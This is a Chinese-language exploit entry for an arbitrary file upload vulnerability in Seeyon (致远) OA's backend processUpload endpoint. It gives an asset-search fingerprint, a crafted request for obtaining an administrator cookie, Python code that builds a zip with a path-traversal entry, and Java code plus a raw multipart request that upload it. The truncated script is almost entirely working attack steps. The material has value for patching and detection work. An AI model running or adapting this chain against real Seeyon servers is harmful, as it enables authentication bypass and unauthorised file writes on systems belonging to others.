# 致远OA后台processUpload任意文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="致远 OA"`
- **请求**：`POST /seeyon/thirdpartyController.do HTTP/1.1`

**请求体 / payload**
```
1. 获取管理员cookie
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 133
method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
2. 生成压缩文件payload
压缩文件名为`stc.zip`,上传文件名为`stc.txt`,文件内容为`c9b3995f-2d74-448d-a742-34f72cfa1e14`
import zipfile
zf=zipfile.ZipFile('test.zip', mode='a', compression=zipfile.ZIP_DEFLATED)
fname=f'..\\stc.txt'
shellcode="c9b3995f-2d74-448d-a742-34f72cfa1e14"
zf.writestr('layout.xml', "")
zf.writestr(fname, shellcode)
3. 使用获取到的cookie利用exp上传压缩文件
import com.github.kevinsawicki.http.HttpRequest;
import java.io.File;
public class TestMain {
public static void main(String[] args) {
File file = new File("src/test.zip");
String url = "http://xx.xx.xx.xx/seeyon/fileUpload.do?method=processUpload&amp;maxSize";
HttpRequest request = HttpRequest.post(url)
.header("Cookie","JSESSIONID=362A92A2CE0674D8C07ECF20CB8FCD36")
.part("type", "")
.part("extensions","")
.part("applicationCategory","")
.part("applicationCategory","")
.part("destFilename","")
.part("maxSize","")
.part("isEncrypt","")
.part("file1","test.zip",file);
System.out.println(request.code());
System.out.println(request.body());
POST /seeyon/fileUpload.do?method=processUpload&amp;maxSize HTTP/1.1
Cookie: JSESSIONID=362A92A2CE0674D8C07ECF20CB8FCD36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: xx.xx.xx.xx
Content-Length: 938
--00content0boundary00
Content-Disposition: form-data; …（脚本共 2800 字，完整版见原文）
```

**其他**
- 致远OA 后台processUpload任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远OA